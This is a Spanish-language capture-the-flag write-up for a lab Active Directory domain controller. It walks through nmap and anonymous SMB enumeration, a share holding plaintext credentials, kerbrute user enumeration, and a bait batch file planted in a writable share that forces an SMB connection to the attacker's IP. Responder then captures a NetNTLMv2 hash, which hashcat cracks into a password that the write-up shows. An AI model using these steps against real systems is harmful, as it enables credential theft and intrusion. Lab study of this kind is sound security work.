# PROXY

Máquina Windows con **Active Directory** (nivel principiante, en el laboratorio local).

- **IP:** `10.65.144.56`
- **Dominio:** `ctf.local`
- **Controlador de dominio:** `DC01.ctf.local`
- **Directorio de trabajo en Kali:** `/home/kali/Desktop/proxy`

## 1. Reconocimiento con nmap

Primer paso, escaneo completo de servicios con `nmap`, guardando la salida en un archivo para tenerla de referencia:

```
nmap -sV -sC -T4 10.65.144.56 -oN port_scan.txt
```

![[Pasted image 20261026005220.png]]

Quedan abiertos **12 puertos** (el resto está filtrado):

| Puerto | Servicio | Detalle |
|---|---|---|
| 53/tcp | DNS | Simple DNS Plus |
| 88/tcp | Kerberos | Autenticación del dominio |
| 135/tcp | MSRPC | RPC de Windows |
| 139/tcp | NetBIOS | Sesión SMB |
| 389/tcp | LDAP | **AD Domain: ctf.local** |
| 445/tcp | SMB | Compartidos de archivos |
| 464/tcp | kpasswd5 | Cambio de contraseña Kerberos |
| 593/tcp | RPC over HTTP | |
| 636/tcp | LDAPS | LDAP sobre SSL |
| 3268/tcp | LDAP | Global Catalog |
| 3269/tcp | LDAPS | Global Catalog sobre SSL |
| 3389/tcp | RDP | Escritorio remoto |

Lo que nos dice el escaneo:

- Los scripts de SMB (`smb2-security-mode`) indican **message signing enabled and required**, así que no vale la idea de hacer relay SMB.
- El certificado SSL y el script de RDP revelan el nombre real: **`DC01.ctf.local`**, con el dominio **`ctf.local`** y árbol DNS `ctf.local`.
- Servicio identificado: `Service Info: Host: DC01; OS: Windows`.
- El script `ldap-rootdse` ya nos anuncia `Domain: ctf.local`.

Esto es un **controlador de dominio**: los caminos típicos pasan por SMB, LDAP y Kerberos.

## 2. Enumeración de SMB con smbclient

Con el 445 abierto, listamos los recursos que comparte el servidor (`-N` para ir sin contraseña):

```
smbclient -L //10.65.144.56 -N
```

![[Pasted image 20261026005205.png]]

| Recurso | Tipo | Comentario |
|---|---|---|
| `ADMIN$` | Disk | Remote Admin |
| `C$` | Disk | Default share |
| `IPC$` | Disk | Remote IPC |
| **`IT-Shared`** | Disk | **IT Department Shared Resources** |
| `NETLOGON` | Disk | Logon server share |
| `SYSVOL` | Disk | SYSVOL share |

Los `$` de siempre (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) son los compartidos estándar de todo DC. Lo que llama la atención es **`IT-Shared`**: un recurso de departamento, no estándar, y probablemente con información útil.

## 3. Descarga de los archivos del compartido

Nos conectamos al compartido interesante y listamos su contenido:

```
smbclient //10.65.144.56/IT-Shared -N
smb: \> ls
```

![[Pasted image 20261026005353.png]]

```
IT-Credentials-Backup.txt   406
IT-Onboarding-Checklist.txt 676
IT-Portal.html             4887
```

Descargamos todo con `mget *`:

```
smb: \> mget *
```

Y comprobamos en local que los tenemos:

![[Pasted image 20261026005550.png]]

## 4. Análisis de los archivos descargados

### IT-Credentials-Backup.txt

![[Pasted image 20261026010327.png]]

```
helpdesk.bob : Welcome123!     [DISABLED - left company 2021]
it.admin     : ITAdmin2019!    [DISABLED - role change 2022]
```

Parece un chorreto de credenciales, pero **no nos sirven para entrar**: ambas cuentas están deshabilitadas. Lo que sí nos dan son **nombres de usuario reales del dominio** (`helpdesk.bob`, `it.admin`) y un aviso importante: las cuentas de servicio activas las gestiona el equipo de sysadmin (es decir, por ahí andarán otras cuentas tipo `svc.*`).

### IT-Onboarding-Checklist.txt

![[Pasted image 20261026010721.png]]

La checklist de incorporación suelta información muy valiosa sobre **servicios automatizados**:

- **`svc.scanner`** → File Scanner: corre cada 2 minutos, enumera `IT-Shared` en busca de archivos nuevos y usa *Shell enumeration* para inspeccionar metadatos e iconos.
- **`svc.mssql`** → Database Backup: hace los backups nocturnos de MSSQL, es **miembro de Backup Operators** y su contraseña rota trimestralmente.
- Contacto: `helpdesk@ctf.local`.

Dos cuentas de servicio candidatas a fuerza bruta, más una pista de privilegios (Backup Operators).

### IT-Portal.html

Es el HTML del portal interno (4.887 bytes):

```
cat IT-Portal.html
```

*(pendiente de analizar: mirar el código fuente, formularios, scripts y comentarios)*

## 5. Configuración del hosts

Para trabajar con el nombre del dominio en lugar de la IP, añadimos una entrada en `/etc/hosts`:

```
echo "10.65.144.56 ctf.local" >> /etc/hosts
```

![[Pasted image 20261026011834.png]]

## 6. Enumeración de usuarios con Kerbrute

Con el dominio configurado, enumeramos usuarios válidos del dominio con `kerbrute`:

```
kerbrute userenum --dc 10.65.144.56 -d ctf.local /home/kali/SecLists/Usernames/xato-net-10-million-usernames.txt
```

![[Pasted image 20261026013522.png]]

```
2026/10/26 02:21:35 >  [+] VALID USERNAME:       guest@ctf.local
2026/10/26 02:21:47 >  [+] VALID USERNAME:       administrator@ctf.local
2026/10/26 02:23:35 >  [+] VALID USERNAME:       Guest@ctf.local
2026/10/26 02:23:36 >  [+] VALID USERNAME:       Administrator@ctf.local
2026/10/26 02:29:57 >  [+] VALID USERNAME:       GUEST@ctf.local
```

**Lectura del resultado:** solo aparecen las dos cuentas built-in de Windows (`Administrator` y `Guest`), y en realidad son tres líneas para la misma cuenta, porque Kerberos distingue mayúsculas y minúsculas: `guest`, `Guest` y `GUEST` es el mismo usuario. **No ha salido ninguna cuenta de usuario real del dominio.**

¿Por qué? La wordlist `xato-net-10-million-usernames.txt` es una lista de nombres genéricos: no trae los nombres de servicio que sí sabemos que existen por el `IT-Onboarding-Checklist.txt` (`svc.scanner`, `svc.mssql`) ni los del backup de credenciales (`helpdesk.bob`, `it.admin`).

> **Aclaración:** `helpdesk@ctf.local` **no lo ha validado kerbrute**. Esa dirección aparece en la checklist como correo de contacto (*"Questions? Email helpdesk@ctf.local"*), no como cuenta confirmada.


## 7. Capturar credenciales: forzar la autenticación de svc.scanner

Volvemos al `IT-Onboarding-Checklist.txt`: **`svc.scanner` recorre `IT-Shared` cada 2 minutos** buscando archivos nuevos para procesar. Si le dejamos algo en el compartido, ese servicio va a tocarlo; la cuestión es que, al hacerlo, se conecte a nuestra máquina y nos deje su hash.

**Paso 1 · Cebo en el compartido.** Subimos dos ficheros con `smbclient`:

```
smbclient //10.65.144.56/IT-Shared -N
smb: \> put test.bat
smb: \> put test.txt
smb: \> ls
```

![[Captura de pantalla 2026-10-26 021238.png]]

**Paso 2 · El contenido del cebo.** En `test.bat` solo hay una orden que fuerza una conexión SMB hacia nuestra IP y la descarta (`>nul 2>&1`) para que pase desapercibida:

![[Captura de pantalla 2026-10-26 021521 1.png]]

```bat
@echo off
dir \\192.168.131.171\share >nul 2>&1
```

**Paso 3 · Escucha con Responder.** En Kali levantamos Responder en la interfaz `tun0` (LLMNR y NBT-NS en ON) para responder a cualquier consulta de nombre y capturar la autenticación:

```
responder -I tun0
```

![[Captura de pantalla 2026-10-26 021411.png]]

**Paso 4 · Esperar.** Pasados unos minutos el servicio toca el cebo y la autenticación llega a nuestro Responder:

```
[SMB] NTLMv2-SSP Client   : 10.65.144.56
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     :svc.scanner::CTF:f0af704c43a23951:EBEFE907886EB823E7C9B94213CFEB35:010100000000000080D5131BF664DD014B0DD7CE319DD9850000000002000800540047004C005A0001001E00570049004E002D0048005800580059004100410050004F0048004D00560004003400570049004E002D0048005800580059004100410050004F0048004D0056002E00540047004C005A002E004C004F00430041004C0003001400540047004C005A002E004C004F00430041004C0005001400540047004C005A002E004C004F00430041004C000700080080D5131BF664DD01060004000200000008003000300000000000000001000000002000004B1ED4C5D621E5897EEA4007D44D5DBD149F0674BDCD65BEFF9ED72EA83A25280A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100330031002E003100370031000000000000000000   


```

**Resultado:** un hash NetNTLMv2 de la cuenta `CTF\svc.scanner` — justo el usuario de servicio real que kerbrute no encontró. Responder lo guarda además en `/usr/share/responder/logs/SMB-NTLMv2-SSP.txt`.

![[Pasted image 20261026020232.png]]

## 8. Cracking del hash (pendiente)

Ese hash **no es la contraseña**: es una respuesta criptográfica al reto del servidor. Hay dos caminos:

**a) Cracking offline** — hashcat en modo `5600` (NetNTLMv2) o john con formato `netntlmv2`:

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

```


por lo cual encontramos contraseña 

```
1summerlove!
``` 

domo podemos ver que tenemos credenciales 

![[Pasted image 20261027004943.png]]